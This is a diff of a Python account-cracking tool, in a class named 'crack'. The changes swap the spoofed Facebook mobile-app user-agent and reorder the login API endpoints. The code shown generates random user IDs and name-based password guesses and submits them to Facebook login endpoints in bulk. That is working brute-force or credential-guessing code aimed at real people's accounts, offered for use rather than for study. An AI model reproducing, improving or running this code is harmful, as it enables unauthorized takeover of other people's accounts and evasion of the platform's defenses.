@@ -722,7 +722,7 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=720,height=1520};FBLC/es_ES;FBRV/0;FBCR/Banglalink;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/v29e;FBSV/7;FBOP/3;FBCA/x64:arm64-v8a;]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.0,width=720,height=1344};FBLC/en_US;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Y2;FBSV/9;FBCA/armeabi-v7a:armeabi;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
@@ -926,9 +926,9 @@ class crack:
                         else:
                             hf = self.ggs.replace("First", xz[0]).replace("first", xz[0].lower()).replace("Last", xz[1]).replace("last", xz[1].lower()).replace("Name", name).replace("name", name.lower()).splitlines()
                         pwx = hf
-                        url1 = 'https://b-graph.facebook.com/auth/login'
+                        url1 = 'https://b-api.facebook.com/method/auth.login'
                         url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
-                        url3 = 'https://b-api.facebook.com/method/auth.login'
+                        url3 = 'https://b-graph.facebook.com/auth/login'
                         if vz == '1' and uz == '1':
                             __GSXDbrand__.submit(self.__mbasic__,uid,pwx,"free.facebook.com")
                         elif vz == '1' and uz == '2':
@@ -1050,9 +1050,9 @@ class crack:
                             juid = GSXDxd.split('|')[0]
                             uid = k+juid
                             pwx = pwzzz.replace('number', juid).replace('full', k).splitlines()
-                            url1 = 'https://b-graph.facebook.com/auth/login'
+                            url1 = 'https://b-api.facebook.com/method/auth.login'
                             url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
-                            url3 = 'https://b-api.facebook.com/method/auth.login'
+                            url3 = 'https://b-graph.facebook.com/auth/login'
                             if vz == '1' and uz == '1':
                                 __GSXDTEAM__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                             elif vz == '1' and uz == '2':
@@ -1168,9 +1168,9 @@ class crack:
                             juid = GSXDxd.split('|')[0]
                             uid = k+c+juid
                             pwx = pwzzz.replace('number', c+juid).splitlines()
-                            url1 = 'https://b-graph.facebook.com/auth/login'
+                            url1 = 'https://b-api.facebook.com/method/auth.login'
                             url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
-                            url3 = 'https://b-api.facebook.com/method/auth.login'
+                            url3 = 'https://b-graph.facebook.com/auth/login'
                             if vz == '1' and uz == '1':
                                 __GSXDTEAM__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                             elif vz == '1' and uz == '2':
@@ -1285,9 +1285,9 @@ class crack:
                             juid = GSXDxd.split('|')[0]
                             uid = k+c+juid
                             pwx = pwzzz.replace('number', juid).replace('full', c).splitlines()
-                            url1 = 'https://b-graph.facebook.com/auth/login'
-                            url2 = 'https://b-graph.facebook.com/auth/login'
-                            url3 = 'https://b-api.facebook.com/method/auth.login'
+                            url1 = 'https://b-api.facebook.com/method/auth.login'
+                            url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+                            url3 = 'https://b-graph.facebook.com/auth/login'
                             if vz == '1' and uz == '1':
                                 __GSXDTEAM__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                             elif vz == '1' and uz == '2':
